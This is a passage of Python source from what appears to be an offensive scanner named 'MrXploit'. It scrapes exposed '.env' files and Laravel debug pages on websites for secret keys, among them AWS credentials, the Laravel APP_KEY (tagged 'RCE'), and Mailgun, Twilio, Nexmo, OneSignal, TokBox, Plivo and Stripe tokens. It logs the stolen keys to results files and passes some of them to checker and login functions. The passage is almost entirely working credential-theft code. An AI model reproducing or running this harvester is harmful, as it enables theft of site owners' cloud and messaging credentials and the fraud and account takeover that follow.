					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_ACCESS_KEY_ID_SNAPSHOT" in str(text):
				if "AWS_ACCESS_KEY_ID_SNAPSHOT=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_ACCESS_KEY_ID_SNAPSHOT=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY_SNAPSHOT=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID_SNAPSHOT</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID_SNAPSHOT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY_SNAPSHOT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "# AWS_KEY" in str(text):
				if "# AWS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n# AWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n# AWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td># AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td># AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td># AWS_SECRE<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SQS_KEY" in str(text):
				if "SQS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSQS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSQS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SQS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SQS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SQS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWSOWL_ACCESS_KEY_ID" in str(text):
				if "AWSOWL_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWSOWL_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWSOWL_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWSOWL_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWSOWL_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWSOWL_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "WAS_ACCESS_KEY_ID" in str(text):
				if "WAS_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nWAS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nWAS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>WAS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>WAS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>WAS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			else:
				if "AKIA" in str(text):
					save = open('Results/AKIA.txt','a')
					save.write(str(url)+'\n')
					save.close()
				return False
		except:
			return False
	def get_appkey(self, text, url):
		try:
			if "APP_KEY =" in text or "APP_KEY=":
				method =  '/.env'
				try:
					appkey = reg('\nAPP_KEY=(.*?)\n', text)[0]
				except:
					try:
						appkey = appkey = reg('\nAPP_KEY = (.*?)\n', text)[0]
					except:
						appkey = False
			elif "<td>APP_KEY</td>" in text:
				method = 'debug'
				appkey = reg('<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

			if appkey:
				build = str(url) + '|' + appkey
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}RCE {fc}[{yl}{appkey}{fc}]")
				save = open(o_keya, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_mailgun(self, text, url):
		try:
			if "MAILGUN_DOMAIN" in text:
				if "MAILGUN_SECRET=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nMAILGUN_DOMAIN=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('\nMAILGUN_SECRET=(.*?)\n', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('\nMAILGUN_ENDPOINT=(.*?)\n', text)[0]
					except:
						sec = ''
				elif '<td>MAILGUN_DOMAIN</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('<td>MAILGUN_ENDPOINT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''

				build = str(acc_sid)+'|'+str(acc_key)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{acc_sid}{res}:{fc}{acc_key}{fc}]")
				save = open(o_mgapi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SMS_API_SENDER_ID" in text:
				if "SMS_API_SENDER_ID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nSMS_API_SENDER_ID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nSMS_API_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nSMS_API_FROM=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>SMS_API_SENDER_ID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>SMS_API_SENDER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>SMS_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>SMS_API_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSMS_API_SENDER_ID: '+str(acc_sid)+'\nSMS_API_TOKEN: '+str(auhtoken)+'\nSMS_API_FROM: '+str(phone)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SMS {fc}[{yl}{acc_sid}{res}:{fc}{authtoken}{fc}]")
				save = open(o_twilio, 'a')
				save.write(remover+'\n')
				save.close()
				MrXploittwilio2(acc_sid,authtoken)
				return True
			elif "TWILIO_SID" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TWILIO_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(auhtoken)+'\nTWILIO_NUMBER: '+str(phone)
				remover = str(build).replace('\r', '')
				save = open(o_twilio, 'a')
				save.write(remover+'\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SMS {fc}[{yl}{acc_sid}{res}:{fc}{authtoken}{fc}]")
				save.close()
				MrXploittwilio2(acc_sid,authtoken)
				return True
			elif "=AC" in text:
				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open(o_twilio, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_manual(self, text, url):
		try:
			if "PLIVO" in text or "plivo" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_pliv, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "CLICKSEND" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_click, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MANDRILL" in text or "mandrill" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_drill, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MAILJET" in text or "mailjet" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_jet, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MAILGUN" in text or "mailgun" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_gun, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MESSAGEBIRD" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_bird, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SMS_" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_sms, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "VONAGE" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_von, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "NEXMO" in text or "nexmo" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_nex, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif 'characters">AKIA' in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_aws_man, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif 'characters">AC' in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_twi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "= AC" in text or "=AC" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_twi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "= AKIA" in text or "=AKIA" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_aws_man, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_nexmo2(self, text, url):
		try:
			if "NEXMO" in text:
				if "NEXMO_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''
				elif '<td>NEXMO_KEY</td>' in text:
					method = 'debug'
					try:
						nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "NEXMO_API_KEY" in text:
				if "NEXMO_API_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('\nNEXMO_API_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('\nNEXMO_API_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''

				elif '<td>NEXMO_API_KEY</td>' in text:
					method = 'debug'
					try:
						nexmo_key = reg('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "NEXMO_API_KEY" in text:
				if "NEXMO_API_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('NEXMO_API_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('NEXMO_API_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''

				elif 'NEXMO_KEY' in text:
					method = 'debug'
					try:
						nexmo_key = reg('NEXMO_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('NEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "EXOTEL_API_KEY" in text:
				if "EXOTEL_API_KEY=" in text:
					method = '/.env'
					try:
						exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
					except:
						exotel_sid = ''
				elif '<td>EXOTEL_API_KEY</td>' in text:
					method = 'debug'
					try:
						exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_sid = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
				remover = str(build).replace('\r', '')
				save = open(o_exo, 'a')
				save.write(remover+'\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}EXOTEL {fc}[{yl}{exotel_api}{res}:{fc}{exotel_token}{fc}]")
				save.close()
				return True
			elif "ONESIGNAL_APP_ID" in text:
				if "ONESIGNAL_APP_ID=" in text:
					method = '/.env'
					try:
						onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
					except:
						onesignal_auth = ''
				elif '<td>ONESIGNAL_APP_ID</td>' in text:
					method = 'debug'
					try:
						onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_token = ''
					try:
						onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_auth = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}ONESIGNAL {fc}[{yl}{onesignal_id}{res}:{fc}{onesignal_token}{fc}]")
				save = open(o_one, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY_DEV" in text:
				if "TOKBOX_KEY_DEV=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_DEV</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY" in text:
				if "TOKBOX_KEY=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY_OLD" in text:
				if "TOKBOX_KEY_OLD=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_OLD=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_OLD=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_OLD</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "PLIVO_AUTH_ID" in text:
				if "PLIVO_AUTH_ID=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>PLIVO_AUTH_ID</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPLIVO_AUTH_ID: '+str(plivo_auth)+'\nPLIVO_AUTH_TOKEN: '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open(o_plivo, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY" in text:
				if "STRIPE_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
					except:
